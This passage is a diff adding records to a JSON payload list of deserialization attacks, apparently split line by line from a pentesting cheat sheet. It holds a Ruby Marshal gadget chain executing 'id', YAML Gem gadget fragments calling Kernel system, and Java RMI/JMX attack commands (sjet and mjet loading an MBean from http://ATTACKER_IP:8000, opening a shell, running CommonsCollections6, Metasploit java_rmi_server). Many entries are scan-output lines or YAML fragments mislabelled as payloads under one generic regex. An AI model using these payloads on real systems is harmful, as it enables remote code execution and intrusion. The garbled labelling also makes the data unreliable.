+    "payload_string": "for i in {0..5}; do docker run -it ruby:2.${i} ruby -e 'Marshal.load([\"0408553a1547656d3a3a526571756972656d656e745b066f3a1847656d3a3a446570656e64656e63794c697374073a0b4073706563735b076f3a1e47656d3a3a536f757263653a3a537065636966696346696c65063a0a40737065636f3a1b47656d3a3a5374756253706563696669636174696f6e083a11406c6f616465645f66726f6d49220d7c696420313e2632063a0645543a0a4064617461303b09306f3b08003a1140646576656c6f706d656e7446\"].pack(\"H*\")) rescue nil'; done",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240955",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "require \"yaml\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240956",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "YAML.load(File.read(\"p.yml\"))",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240957",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "--- !ruby/object:Gem::Requirement",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240958",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "requirements:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240959",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "!ruby/object:Gem::DependencyList",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240960",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "specs:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240961",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "- !ruby/object:Gem::Source::SpecificFile",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240962",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "spec: &1 !ruby/object:Gem::StubSpecification",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240963",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "loaded_from: \"|id 1>&2\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240964",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "spec:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240965",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "- !ruby/object:Gem::Installer",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240966",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "i: x",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240967",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "- !ruby/object:Gem::SpecFetcher",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240968",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "i: y",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240969",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "- !ruby/object:Gem::Requirement",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240970",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "!ruby/object:Gem::Package::TarReader",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240971",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "io: &1 !ruby/object:Net::BufferedIO",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240972",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "io: &1 !ruby/object:Gem::Package::TarReader::Entry",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240973",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "read: 0",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240974",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "header: \"abc\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240975",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "debug_output: &1 !ruby/object:Net::WriteAdapter",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240976",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "socket: &1 !ruby/object:Gem::RequestSet",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240977",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "sets: !ruby/object:Net::WriteAdapter",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240978",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "socket: !ruby/module 'Kernel'",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240979",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "method_id: :system",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240980",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "git_set: id",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240981",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "method_id: :resolve",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240982",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "git_set: sleep 600",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-242514",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "$ nmap -sV --script \"rmi-dumpregistry or rmi-vuln-classloader\" -p TARGET_PORT TARGET_IP -Pn -v",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-242515",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "1089/tcp open  java-rmi Java RMI",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-242516",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "| rmi-vuln-classloader:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-242517",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "|   VULNERABLE:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-242518",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "|   RMI registry default configuration remote code execution vulnerability",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-242519",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "|     State: VULNERABLE",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-242520",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "|       Default configuration of RMI registry allows loading classes from remote URLs which can lead to remote code execution.",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-242521",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "| rmi-dumpregistry:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-242522",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "|   jmxrmi",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-242523",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "|     javax.management.remote.rmi.RMIServerImpl_Stub",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-242524",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "$ rmg scan 172.17.0.2 --ports 0-65535",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-242531",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "$ rmg enum 172.17.0.2 9010",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-242542",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "use auxiliary/scanner/misc/java_rmi_server",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-242543",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "set RHOSTS <IPs>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-242544",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "set RPORT <PORT>",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-242545",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "run",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-242546",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "beanshooter model 172.17.0.2 9010 de.qtc.beanshooter:version=1 java.io.File 'new java.io.File(\"/\")'",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-242547",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "beanshooter invoke 172.17.0.2 9010 de.qtc.beanshooter:version=1 --signature 'list()'",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-242548",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "jython sjet.py TARGET_IP TARGET_PORT super_secret install http://ATTACKER_IP:8000 8000",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-242549",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "jython sjet.py TARGET_IP TARGET_PORT super_secret command \"ls -la\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-242550",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "jython sjet.py TARGET_IP TARGET_PORT super_secret shell",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-242551",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "jython sjet.py TARGET_IP TARGET_PORT super_secret password this-is-the-new-password",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-242552",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "jython sjet.py TARGET_IP TARGET_PORT super_secret uninstall",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-242553",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "jython mjet.py --jmxrole admin --jmxpassword adminpassword TARGET_IP TARGET_PORT deserialize CommonsCollections6 \"touch /tmp/xxx\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-242554",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "jython mjet.py TARGET_IP TARGET_PORT install super_secret http://ATTACKER_IP:8000 8000",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-242555",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "jython mjet.py TARGET_IP TARGET_PORT command super_secret \"whoami\"",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-242556",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "jython mjet.py TARGET_IP TARGET_PORT command super_secret shell",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-242557",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "use exploit/multi/misc/java_rmi_server",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-252111",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "__construct",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-252112",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "__destruct",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-252113",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "__call",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-252114",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "__callStatic",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-252115",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "__get",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-252116",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "__set",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-252117",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "__isset",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-252118",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "__unset",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-252119",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "__sleep",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-252120",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "__wakeup",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-252121",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "__serialize",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-252122",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "__unserialize",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-252123",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "__toString",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-252124",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "__invoke",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-252125",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "__set_state",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-252126",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "__clone",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-252127",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "query_parameter",
+    "payload_string": "__debugInfo",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  }
+]
